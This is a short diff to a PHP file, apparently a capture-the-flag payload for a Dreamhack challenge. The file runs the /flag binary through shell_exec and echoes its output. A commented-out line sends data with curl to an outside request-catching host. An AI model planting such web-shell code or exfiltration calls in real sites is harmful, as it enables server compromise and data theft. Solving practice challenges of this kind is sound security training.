@@ -1,4 +1,4 @@
 <?php 
-    echo(shell_exec("/flag > /var/www/html/b.txt"));
+    echo(shell_exec("/flag"));
     #system('curl https://dwaysxe.request.dreamhack.games -d b');
 ?>
